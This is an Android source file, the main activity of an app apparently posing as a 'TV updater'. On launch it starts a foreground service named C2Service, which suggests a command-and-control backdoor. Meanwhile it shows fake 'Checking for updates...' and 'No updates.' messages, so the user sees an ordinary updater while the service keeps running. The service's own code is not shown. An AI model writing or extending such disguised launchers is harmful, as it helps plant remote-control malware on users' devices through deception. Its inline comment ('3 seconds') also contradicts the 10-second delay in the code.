package com.app.tvupdater;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i("TvUpdater", "MainActivity launched, starting service");
        Intent serviceIntent = new Intent(this, C2Service.class);
        startForegroundService(serviceIntent);

        // Show update status
        Toast.makeText(this, "Checking for updates...", Toast.LENGTH_LONG).show();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Toast.makeText(this, "No updates.", Toast.LENGTH_LONG).show();
            Log.i("TvUpdater", "Finishing MainActivity");
            finish();
        }, 10000);  // 3 seconds
    }
}
